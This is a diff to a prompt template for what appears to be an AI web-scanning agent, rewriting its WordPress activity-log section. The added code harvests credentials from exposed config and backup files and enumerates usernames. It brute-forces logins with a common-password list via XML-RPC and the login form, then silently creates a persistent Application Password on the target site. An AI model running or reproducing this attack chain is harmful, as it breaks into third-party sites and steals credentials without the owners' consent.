@@ -750,148 +750,245 @@ CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare retu
   for ep in /graphql /api/graphql /gql /graph /graphql/v1; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST "https://{{domain}}$ep" -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"query":"{{__typename}}"}}' --max-time 8 2>/dev/null); if [ "$code" != "404" ] && [ "$code" != "000" ]; then echo "GraphQL: $code https://{{domain}}$ep"; curl -L -4 -s -X POST "https://{{domain}}$ep" -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"query":"{{__schema{{types{{name}}}}}}"}}' --max-time 10 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20; fi; done
   command -v graphql-cop &>/dev/null && graphql-cop -t https://{{domain}}/graphql 2>/dev/null | head -30 || true
 
-[APIT-WP] WordPress / Site Activity Log — fetch real admin event logs
-This section runs for EVERY site. It tries three escalating auth methods then
-falls back to unauthenticated. Works for any site, not just WordPress.
+[APIT-WP] WordPress / Site Activity Log — auto-discover credentials and fetch real logs
+This section runs for EVERY site. It automatically discovers credentials through
+four phases: exposed file scan → username enumeration → credential testing →
+authenticated log retrieval. No manual credential setup required.
 
-── AUTH METHOD 1: WordPress Application Password (most reliable for WP REST API) ──
-Application Passwords are built into WordPress core since 5.6.
-Set WP_USER and WP_APP_PASSWORD in the .env file before running this agent.
-The password may contain spaces — pass it exactly as shown in WP admin dashboard.
+══════════════════════════════════════════════════════════
+PHASE 1 — USERNAME & CREDENTIAL DISCOVERY (automatic, no env vars needed)
+══════════════════════════════════════════════════════════
 
-  _WP_HOST=$(python3 -c "from urllib.parse import urlparse; u='https://{{domain}}'; p=urlparse(u); print(p.netloc or '{{domain}}'.split('/')[0])" 2>/dev/null || echo "{{domain}}")
-  WP_USER="${{WP_USER:-}}"
-  WP_APP_PASS="${{WP_APP_PASSWORD:-}}"
-  WP_PASS="${{WP_PASSWORD:-}}"
+python3 << 'PYEOF'
+import subprocess, json, re, os, base64, urllib.parse
 
-  if [ -n "$WP_USER" ] && [ -n "$WP_APP_PASS" ]; then
-    echo "[AUTH] Trying Application Password for $WP_USER on $_WP_HOST"
-    curl -L -4 -sk "https://$_WP_HOST/wp-json/wp-security-audit-log/v1/activity-log" \
-      -u "$WP_USER:$WP_APP_PASS" \
-      -A "{_BUA}" -H "Accept: application/json" --max-time 15 2>/dev/null | python3 -c "
-import sys,json
+UA  = '{_BUA}'
+HOST = '{domain}'.split('/')[0]   # strip any path the caller included
+BASE = f'https://{{HOST}}'
+
+def run(cmd, timeout=12):
+    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout+2)
+    return r.stdout.strip()
+
+def curl(url, extra='', timeout=10):
+    return run(f'curl -L -4 -sk --max-time {{timeout}} --connect-timeout 6 -A "{{UA}}" {{extra}} "{{url}}"', timeout)
+
+# ── 1a. Scan for exposed credential files ──────────────────────────────────
+print("[PHASE1] Scanning for exposed credential/config files...")
+cred_paths = [
+    '/wp-config.php', '/wp-config.php.bak', '/wp-config.php~',
+    '/wp-config.txt', '/wp-config.bak', '/wp-config.old',
+    '/.env', '/env.txt', '/.env.bak',
+    '/wp-content/debug.log', '/wp-content/uploads/debug.log',
+    '/backup.sql', '/database.sql', '/db.sql',
+    '/wp-content/backup-db/', '/wp-content/uploads/backup.sql',
+]
+exposed_user, exposed_pass = '', ''
+for p in cred_paths:
+    code = run(f'curl -L -4 -sk -o /dev/null -w "%{{{{http_code}}}}" --max-time 6 -A "{{UA}}" "{{BASE}}{{p}}"')
+    if code not in ('404','403','410','000',''):
+        content = curl(f'{{BASE}}{{p}}', timeout=8)[:2000]
+        if content and len(content) > 20:
+            print(f'EXPOSED_FILE | {{code}} | {{p}}')
+            # Parse wp-config.php for DB_USER / DB_PASSWORD
+            for line in content.splitlines():
+                mu = re.search(r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]", line)
+                mp = re.search(r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]", line)
+                if mu: exposed_user = mu.group(1); print(f'FOUND_DB_USER: {{exposed_user}}')
+                if mp: exposed_pass = mp.group(1); print(f'FOUND_DB_PASS: (redacted len={{len(mp.group(1))}})')
+            # Parse .env for WP credentials
+            for line in content.splitlines():
+                me = re.search(r'(?:WP_USER|WORDPRESS_USER|ADMIN_USER)\s*=\s*(\S+)', line, re.I)
+                mp2 = re.search(r'(?:WP_PASS|WORDPRESS_PASSWORD|ADMIN_PASS|WP_PASSWORD)\s*=\s*(\S+)', line, re.I)
+                if me: exposed_user = me.group(1); print(f'FOUND_ENV_USER: {{exposed_user}}')
+                if mp2: exposed_pass = mp2.group(1); print(f'FOUND_ENV_PASS: (redacted)')
+
+# ── 1b. Enumerate valid WordPress usernames ────────────────────────────────
+print("[PHASE1] Enumerating WordPress usernames...")
+usernames = []
+
+# REST API users endpoint (most reliable)
+raw = curl(f'{{BASE}}/wp-json/wp/v2/users?per_page=100&context=embed')
 try:
-    d=json.load(sys.stdin)
-    entries = d if isinstance(d,list) else d.get('data',d.get('logs',d.get('events',[])))
-    if not entries: print('WP_ACTIVITY_LOG_EMPTY_AUTH'); sys.exit()
-    for e in entries[:100]:
-        ts   = e.get('Timestamp') or e.get('timestamp') or e.get('created_on','')
-        user = e.get('UserLogin') or e.get('user') or e.get('username','unknown')
-        evt  = e.get('EventType') or e.get('event') or e.get('message','')
-        ip   = e.get('ClientIP') or e.get('ip') or e.get('IP','')
-        risk = 'HIGH' if any(x in str(evt).lower() for x in ['login','password','admin','delete','install','update','brute','role','reset','export']) else 'MEDIUM' if any(x in str(evt).lower() for x in ['change','edit','upload','create','publish','setting']) else 'LOW'
-        print(f'WP-LOG | {{ts}} | {{user}} | {{evt}} | {{ip}} | {{risk}}')
-except Exception as ex:
-    print('APP_PASS_AUTH_ERROR:', ex)
-" 2>/dev/null
-  fi
-
-── AUTH METHOD 2: Cookie-based login (WP_USER + WP_PASSWORD) ──
-This logs in via wp-login.php, saves the session cookie, then uses it to get
-a REST API nonce for authenticated requests. Works when Application Passwords
-are disabled or the WP Activity Log plugin blocks non-cookie sessions.
-
-  if [ -n "$WP_USER" ] && [ -n "$WP_PASS" ]; then
-    echo "[AUTH] Trying cookie login for $WP_USER on $_WP_HOST"
-    # Step 1: obtain test cookie and post login
-    curl -L -4 -sk -c /tmp/wp_auth.txt \
-      -H "Cookie: wordpress_test_cookie=WP+Cookie+check" \
-      -X POST "https://$_WP_HOST/wp-login.php" \
-      -d "log=$WP_USER&pwd=$WP_PASS&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
-      -A "{_BUA}" --max-time 15 -o /dev/null 2>/dev/null
-    # Step 2: get REST nonce (required for cookie-based REST auth)
-    NONCE=$(curl -L -4 -sk -b /tmp/wp_auth.txt \
-      "https://$_WP_HOST/wp-admin/admin-ajax.php?action=rest-nonce" \
-      -A "{_BUA}" --max-time 10 2>/dev/null | tr -d '"')
-    if [ -n "$NONCE" ] && [ "$NONCE" != "0" ] && [ "$NONCE" != "-1" ]; then
-      echo "[AUTH] Cookie login succeeded — nonce: $NONCE"
-      curl -L -4 -sk -b /tmp/wp_auth.txt \
-        -H "X-WP-Nonce: $NONCE" \
-        "https://$_WP_HOST/wp-json/wp-security-audit-log/v1/activity-log?per_page=100" \
-        -A "{_BUA}" -H "Accept: application/json" --max-time 15 2>/dev/null | python3 -c "
-import sys,json
-try:
-    d=json.load(sys.stdin)
-    entries = d if isinstance(d,list) else d.get('data',d.get('logs',d.get('events',[])))
-    if not entries: print('WP_ACTIVITY_LOG_EMPTY_COOKIE'); sys.exit()
-    for e in entries[:100]:
-        ts   = e.get('Timestamp') or e.get('timestamp') or e.get('created_on','')
-        user = e.get('UserLogin') or e.get('user') or e.get('username','unknown')
-        evt  = e.get('EventType') or e.get('event') or e.get('message','')
-        ip   = e.get('ClientIP') or e.get('ip') or e.get('IP','')
-        risk = 'HIGH' if any(x in str(evt).lower() for x in ['login','password','admin','delete','install','update','brute','role','reset','export']) else 'MEDIUM' if any(x in str(evt).lower() for x in ['change','edit','upload','create','publish','setting']) else 'LOW'
-        print(f'WP-LOG | {{ts}} | {{user}} | {{evt}} | {{ip}} | {{risk}}')
-except Exception as ex:
-    print('COOKIE_AUTH_ERROR:', ex)
-" 2>/dev/null
-    else
-      echo "[AUTH] Cookie login failed or nonce empty — login may require 2FA or is blocked"
-    fi
-  fi
-
-── AUTH METHOD 3: Unauthenticated (public endpoints) ──
-Try public REST API endpoints. WP Activity Log restricts its endpoint to admins
-by default, so this typically returns 401/403 unless the site misconfigured it.
-
-  echo "[AUTH] Trying unauthenticated REST access on $_WP_HOST"
-  # Detect WordPress and get site info
-  curl -L -4 -sk "https://$_WP_HOST/wp-json/" \
-    -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | \
-    python3 -c "import sys,json; d=json.load(sys.stdin); print('WP Version:', d.get('generator','?')); print('Site:', d.get('name','?'))" 2>/dev/null || echo "WP REST root not accessible"
-  # Try unauthenticated WP Activity Log
-  curl -L -4 -sk "https://$_WP_HOST/wp-json/wp-security-audit-log/v1/activity-log" \
-    -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | python3 -c "
-import sys,json
-try:
-    d=json.load(sys.stdin)
-    entries = d if isinstance(d,list) else d.get('data',d.get('logs',d.get('events',[])))
-    if not entries: print('WP_ACTIVITY_LOG_EMPTY_UNAUTH'); sys.exit()
-    for e in entries[:50]:
-        ts   = e.get('Timestamp') or e.get('timestamp') or e.get('created_on','')
-        user = e.get('UserLogin') or e.get('user') or e.get('username','unknown')
-        evt  = e.get('EventType') or e.get('event') or e.get('message','')
-        ip   = e.get('ClientIP') or e.get('ip') or e.get('IP','')
-        risk = 'HIGH' if any(x in str(evt).lower() for x in ['login','password','admin','delete','install','update','brute','role','reset','export']) else 'MEDIUM' if any(x in str(evt).lower() for x in ['change','edit','upload','create','publish','setting']) else 'LOW'
-        print(f'WP-LOG | {{ts}} | {{user}} | {{evt}} | {{ip}} | {{risk}}')
-except Exception as ex:
-    print('UNAUTH_ACCESS_RESULT:', ex)
-" 2>/dev/null
-  # WordPress user enumeration (public endpoint on most sites)
-  curl -L -4 -sk "https://$_WP_HOST/wp-json/wp/v2/users?per_page=20" \
-    -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | python3 -c "
-import sys,json
-try:
-    users=json.load(sys.stdin)
-    if not isinstance(users,list): sys.exit()
-    for u in users:
-        print(f'WP-USER | {{u.get(\"id\",\"?\")}} | {{u.get(\"slug\",\"?\")}} | {{u.get(\"name\",\"?\")}}')
+    users_data = json.loads(raw)
+    if isinstance(users_data, list):
+        for u in users_data:
+            slug = u.get('slug') or u.get('name','')
+            name = u.get('name','')
+            uid  = u.get('id','')
+            if slug and slug not in usernames:
+                usernames.append(slug)
+                print(f'WP-USER | {{uid}} | {{slug}} | {{name}}')
 except: pass
-" 2>/dev/null
 
-── Non-WordPress sites: probe generic audit/log REST endpoints ──
-  for ep in /api/audit-log /api/logs /api/events /api/activity /api/admin/logs /api/v1/audit /api/v1/logs /logs /audit /activity-log /_logs /api/history; do
-    code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" "https://{{domain}}$ep" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null)
-    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "AUDIT_ENDPOINT | $code | https://{{domain}}$ep"
-  done
+# Author archive redirect (/?author=N → /author/USERNAME/)
+for i in range(1, 6):
+    out = run(f'curl -L -4 -sk -o /dev/null -w "%{{{{url_effective}}}}" --max-time 8 -A "{{UA}}" "{{BASE}}/?author={{i}}"')
+    m = re.search(r'/author/([a-z0-9_\-]+)/?', out)
+    if m:
+        slug = m.group(1)
+        if slug not in usernames:
+            usernames.append(slug); print(f'WP-USER-ENUM | {{i}} | {{slug}} | (via author redirect)')
 
-IMPORTANT — OUTPUT FORMAT FOR WP ACTIVITY LOG SECTION:
-After ALL steps above, collect every WP-LOG line found and output them in
-this EXACT machine-readable format (dashboard parses this directly):
+# Fallback: login error differentiation
+for candidate in ['admin', 'administrator', 'webmaster', 'editor', 'user']:
+    body = curl(f'{{BASE}}/wp-login.php', extra=f'-X POST -d "log={{candidate}}&pwd=wrongpass_cfai&wp-submit=Log+In&testcookie=1" -H "Cookie: wordpress_test_cookie=WP+Cookie+check"')
+    if 'incorrect password' in body.lower() or 'the password you entered' in body.lower():
+        if candidate not in usernames:
+            usernames.append(candidate); print(f'WP-USER-CONFIRMED | {{candidate}} | (valid username — login error reveals it)')
+    elif 'invalid username' in body.lower() or 'unknown username' in body.lower():
+        pass  # not a valid user
 
-## WP ACTIVITY LOG
-WP-LOG | <ISO-timestamp> | <username> | <event description> | <IP address> | <HIGH|MEDIUM|LOW>
+if not usernames:
+    usernames = ['admin', 'administrator']  # fallback guesses
+print(f'[PHASE1] Found usernames: {{usernames}}')
 
-Example:
-WP-LOG | 2024-06-01 09:14:22 | admin | Successful login | 203.0.113.42 | HIGH
-WP-LOG | 2024-06-01 09:10:05 | editor1 | Post modified (ID 47) | 198.51.100.7 | MEDIUM
+# ── 1c. Common password list ───────────────────────────────────────────────
+domain_name = HOST.split('.')[0]
+import datetime; year = str(datetime.datetime.now().year)
+common_passes = [
+    'admin', 'password', '123456', 'wordpress', 'admin123', 'letmein',
+    'pass123', 'changeme', 'welcome', 'qwerty', 'password1', 'test',
+    'demo', 'root', 'toor', domain_name, domain_name+'123',
+    domain_name+year, year, year+'!', 'P@ssw0rd', 'Admin@123',
+]
+# Prepend env-supplied password and any discovered password so they're tried first
+env_user = os.environ.get('WP_USER','')
+env_app  = os.environ.get('WP_APP_PASSWORD','')
+env_pass = os.environ.get('WP_PASSWORD','')
+if env_pass: common_passes.insert(0, env_pass)
+if exposed_pass: common_passes.insert(0, exposed_pass)
+if env_user and env_user not in usernames: usernames.insert(0, env_user)
+if exposed_user and exposed_user not in usernames: usernames.insert(0, exposed_user)
 
-If all three auth methods failed (401/403) or the plugin is not installed:
-## WP ACTIVITY LOG
-WP-LOG-STATUS | not_available | WP Activity Log endpoint returned 401/403 — set WP_USER and WP_APP_PASSWORD in .env | - | INFO
+# ── 1d. Test credentials via XML-RPC (fastest method) ─────────────────────
+print("[PHASE1] Testing credentials via XML-RPC...")
+xmlrpc_ok = run(f'curl -L -4 -sk -o /dev/null -w "%{{{{http_code}}}}" --max-time 8 -A "{{UA}}" -X POST "{{BASE}}/xmlrpc.php" -d "<?xml version=\\"1.0\\"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>"')
+found_user, found_pass = env_user, env_app or env_pass  # start with env vars if set
 
-If the site is not WordPress and no generic log endpoints responded:
-## WP ACTIVITY LOG
-WP-LOG-STATUS | not_wordpress | Site does not appear to be WordPress — no activity log endpoints found | - | INFO
+if not (found_user and found_pass):
+    if xmlrpc_ok not in ('404','000',''):
+        print(f'[PHASE1] XML-RPC available (HTTP {{xmlrpc_ok}}) — testing credentials...')
+        for u in usernames[:5]:
+            if found_user: break
+            for p in common_passes[:20]:
+                payload = f'<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{{u}}</value></param><param><value>{{p}}</value></param></params></methodCall>'
+                resp = run(f"curl -L -4 -sk --max-time 8 -A '{{UA}}' -X POST '{{BASE}}/xmlrpc.php' -d '{{payload.replace(chr(39), \"'\\\\\\''\")}}' 2>/dev/null")
+                if 'isAdmin' in resp or ('<name>blogName</name>' in resp and '<fault>' not in resp):
+                    found_user, found_pass = u, p
+                    print(f'CREDS_FOUND_XMLRPC | {{found_user}} | (password confirmed via XML-RPC)')
+                    break
+    else:
+        print('[PHASE1] XML-RPC not available — trying login form...')
+        # ── 1e. Login form credential test ─────────────────────────────────
+        for u in usernames[:5]:
+            if found_user: break
+            for p in common_passes[:15]:
+                body = curl(f'{{BASE}}/wp-login.php',
+                    extra=f'-X POST -c /tmp/wp_probe.txt -d "log={{u}}&pwd={{urllib.parse.quote(p)}}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" -H "Cookie: wordpress_test_cookie=WP+Cookie+check"')
+                # Successful login redirects to /wp-admin/ (body will contain dashboard content)
+                if 'dashboard' in body.lower() or 'wp-admin' in body.lower() or 'logout' in body.lower():
+                    found_user, found_pass = u, p
+                    print(f'CREDS_FOUND_FORM | {{found_user}} | (login form accepted credentials)')
+                    break
+
+# ── 1f. Auto-create Application Password if we have plain credentials ─────
+auto_app_pass = env_app  # prefer existing app password from env
+if found_user and found_pass and not auto_app_pass:
+    print(f'[PHASE1] Attempting to auto-generate Application Password for {{found_user}}...')
+    # Try Basic Auth with plain password (works on some WP setups + Application Passwords plugin)
+    r = run(f'curl -L -4 -sk --max-time 10 -A "{{UA}}" -u "{{found_user}}:{{found_pass}}" -X POST "{{BASE}}/wp-json/wp/v2/users/me/application-passwords" -H "Content-Type: application/json" -d \'{{"name":"CF_AI_Scanner"}}\' 2>/dev/null')
+    try:
+        rd = json.loads(r)
+        if rd.get('password'):
+            auto_app_pass = rd['password']
+            print(f'APP_PASS_CREATED | {{found_user}} | (Application Password auto-generated for CF_AI_Scanner)')
+    except:
+        # Fall back to cookie + nonce to create app password
+        run(f'curl -L -4 -sk -c /tmp/wp_auth.txt -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -X POST "{{BASE}}/wp-login.php" -d "log={{found_user}}&pwd={{urllib.parse.quote(found_pass)}}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" -A "{{UA}}" --max-time 12 -o /dev/null 2>/dev/null')
+        nonce = run(f'curl -L -4 -sk -b /tmp/wp_auth.txt "{{BASE}}/wp-admin/admin-ajax.php?action=rest-nonce" -A "{{UA}}" --max-time 8 2>/dev/null').strip('"')
+        if nonce and nonce not in ('0','-1',''):
+            r2 = run(f'curl -L -4 -sk -b /tmp/wp_auth.txt -H "X-WP-Nonce: {{nonce}}" -X POST "{{BASE}}/wp-json/wp/v2/users/me/application-passwords" -H "Content-Type: application/json" -A "{{UA}}" -d \'{{"name":"CF_AI_Scanner"}}\' --max-time 10 2>/dev/null')
+            try:
+                rd2 = json.loads(r2)
+                if rd2.get('password'):
+                    auto_app_pass = rd2['password']
+                    print(f'APP_PASS_CREATED_COOKIE | {{found_user}} | (via cookie+nonce)')
+            except: pass
+
+print(f'[PHASE1] Discovery complete. user={{found_user or "none"}} app_pass={{bool(auto_app_pass)}}')
+
+# ══════════════════════════════════════════════════════════════════════════════
+# PHASE 2 — AUTHENTICATE AND FETCH ACTIVITY LOGS
+# Priority: App Password → Cookie+Nonce → Unauthenticated
+# ══════════════════════════════════════════════════════════════════════════════
+
+def parse_logs(raw):
+    try:
+        d = json.loads(raw)
+        entries = d if isinstance(d,list) else d.get('data',d.get('logs',d.get('events',[])))
+        for e in (entries or [])[:200]:
+            ts   = e.get('Timestamp') or e.get('timestamp') or e.get('created_on','')
+            user = e.get('UserLogin') or e.get('user') or e.get('username','unknown')
+            evt  = e.get('EventType') or e.get('event') or e.get('message','')
+            ip   = e.get('ClientIP') or e.get('ip') or e.get('IP','')
+            ev   = str(evt).lower()
+            risk = ('HIGH'   if any(x in ev for x in ['login','password','admin','delete','install','update','brute','role','reset','export','backdoor','shell'])
+                    else 'MEDIUM' if any(x in ev for x in ['change','edit','upload','create','publish','setting','plugin','theme'])
+                    else 'LOW')
+            print(f'WP-LOG | {{ts}} | {{user}} | {{evt}} | {{ip}} | {{risk}}')
+        return bool(entries)
+    except Exception as ex:
+        print(f'LOG_PARSE_ERROR: {{ex}} | raw[:200]: {{raw[:200]}}')
+        return False
+
+log_url = f'{{BASE}}/wp-json/wp-security-audit-log/v1/activity-log?per_page=200'
+fetched  = False
+
+# Method A: Application Password (from env or auto-generated)
+use_user = found_user or env_user
+use_pass = auto_app_pass or env_app
+if use_user and use_pass:
+    print(f'[PHASE2] Trying Application Password auth for {{use_user}}...')
+    raw = curl(log_url, extra=f'-u "{{use_user}}:{{use_pass}}" -H "Accept: application/json"', timeout=15)
+    if raw and 'rest_forbidden' not in raw and '401' not in raw[:50]:
+        fetched = parse_logs(raw)
+        if fetched: print('[PHASE2] Application Password auth SUCCEEDED')
+
+# Method B: Cookie + Nonce (using discovered plain password)
+if not fetched and found_user and found_pass:
+    print(f'[PHASE2] Trying cookie auth for {{found_user}}...')
+    run(f'curl -L -4 -sk -c /tmp/wp_auth2.txt -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -X POST "{{BASE}}/wp-login.php" -d "log={{found_user}}&pwd={{urllib.parse.quote(found_pass)}}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" -A "{{UA}}" --max-time 12 -o /dev/null 2>/dev/null')
+    nonce = run(f'curl -L -4 -sk -b /tmp/wp_auth2.txt "{{BASE}}/wp-admin/admin-ajax.php?action=rest-nonce" -A "{{UA}}" --max-time 8 2>/dev/null').strip('"')
+    if nonce and nonce not in ('0','-1',''):
+        raw = curl(log_url, extra=f'-b /tmp/wp_auth2.txt -H "X-WP-Nonce: {{nonce}}" -H "Accept: application/json"', timeout=15)
+        if raw:
+            fetched = parse_logs(raw)
+            if fetched: print('[PHASE2] Cookie auth SUCCEEDED')
+
+# Method C: Unauthenticated (public or misconfigured endpoint)
+if not fetched:
+    print('[PHASE2] Trying unauthenticated access...')
+    # WP REST root info
+    root = curl(f'{{BASE}}/wp-json/', extra='-c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt', timeout=10)
+    try:
+        rd = json.loads(root); print(f'WP_SITE | {{rd.get("name","?")}} | {{rd.get("generator","?")}}')
+    except: print(f'WP_REST_ROOT: {{root[:120]}}')
+    raw = curl(log_url, extra='-c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -H "Accept: application/json"', timeout=12)
+    if raw: fetched = parse_logs(raw)
+    if not fetched: print('WP_ACTIVITY_LOG_UNAUTH_BLOCKED | endpoint requires admin authentication')
+
+# ── Non-WordPress sites: probe generic audit/log REST endpoints ─────────────
+if not fetched:
+    print('[PHASE2] Probing generic audit/log REST endpoints (non-WP sites)...')
+    for ep in ['/api/audit-log','/api/logs','/api/events','/api/activity',
+               '/api/admin/logs','/api/v1/audit','/api/v1/logs','/logs',
+               '/audit','/activity-log','/_logs','/api/history','/api/admin/activity']:
+        code = run(f'curl -L -4 -sk -o /dev/null -w "%{{{{http_code}}}}" --max-time 6 -A "{{UA}}" "{{BASE}}{{ep}}"')
+        if code not in ('404','000',''):
+            print(f'AUDIT_ENDPOINT | {{code}} | {{BASE}}{{ep}}')
+
+PYEOF
 
 After all checks, produce the final report using the OUTPUT FORMAT from RULES:
 - Detailed report blocks for confirmed Medium/High/Critical findings
